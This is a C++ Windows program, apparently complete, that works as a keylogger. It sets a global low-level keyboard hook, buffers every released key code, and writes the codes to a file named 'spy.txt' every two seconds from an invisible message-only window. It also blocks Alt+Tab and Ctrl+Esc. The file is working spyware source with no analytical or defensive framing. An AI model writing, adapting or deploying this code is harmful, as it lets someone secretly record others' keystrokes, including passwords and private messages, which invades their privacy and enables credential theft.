#include <Windows.h>
#include <vector>
#include <fstream>

using namespace std;

vector<int> buffer;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode,
	WPARAM wParam, LPARAM lParam) {

	BOOL fEatKeystroke = FALSE;
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

	if (nCode == HC_ACTION) {
		switch (wParam) {
		case WM_KEYUP:    case WM_SYSKEYUP:
		{
			int code = p->vkCode;
			buffer.push_back(code);
		}
		case WM_KEYDOWN:  case WM_SYSKEYDOWN:
			fEatKeystroke =
				((p->vkCode == VK_TAB) && ((p->flags & LLKHF_ALTDOWN) != 0)) ||
				((p->vkCode == VK_ESCAPE) &&
				((p->flags & LLKHF_ALTDOWN) != 0)) ||
					((p->vkCode == VK_ESCAPE) && ((GetKeyState(VK_CONTROL) &
						0x8000) != 0));

			break;
		}
	}
	return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam,
		lParam));
}

/////////////////////////////////////////////////////////////////////////


#define TIMER_ID 1
#define TIMER_DELAY 2000
LPSTR lpzMenuName;
HWND hMainWnd;
HHOOK hhkLowLevelKybd; 

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_TIMER:
	{
		ofstream fout("spy.txt", ios_base::app);
		for (int i = 0; i < buffer.size(); i++)
		{
			fout << buffer[i] << " ";
		}
		buffer.clear();
		fout.close();
		break;
	}
	case WM_COMMAND:
		break;
	case WM_DESTROY:
		UnhookWindowsHookEx(hhkLowLevelKybd);
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

ATOM RegMainWindowClass(HINSTANCE hInstance)
{
	WNDCLASSEX wc = { 0 };

	wc.cbSize = sizeof(WNDCLASSEX);

	wc.style = CS_HREDRAW | CS_VREDRAW;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = hInstance;
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)COLOR_APPWORKSPACE;
	wc.lpszMenuName = lpzMenuName;
	wc.lpszClassName = "MainWndClass";

	return RegisterClassEx(&wc);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, PTSTR pszCmdLine, int) {

	hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL,
		LowLevelKeyboardProc, hInstance, 0);

	if (!RegMainWindowClass(hInstance))
	{
		LPSTR errorMessage;
		FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
			FORMAT_MESSAGE_FROM_SYSTEM |
			FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			GetLastError(),
			0,
			(LPSTR)&errorMessage,
			16,
			NULL);
		MessageBox(NULL,
			errorMessage,
			"Îøèáêà", MB_OK);
		return NULL;
	}

	hMainWnd = CreateWindow("MainWndClass", "Window",
		0, 150, 150, 150, 150, HWND_MESSAGE, NULL,
		hInstance, NULL);
	if (!hMainWnd) return 2;
	SetTimer(hMainWnd, TIMER_ID, TIMER_DELAY, NULL);

	MSG msg = { 0 };
	int iGetOk = 0;
	while ((iGetOk = GetMessage(&msg, NULL, 0, 0)) != 0)
	{
		if (iGetOk == -1) return 3;
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return msg.wParam;
}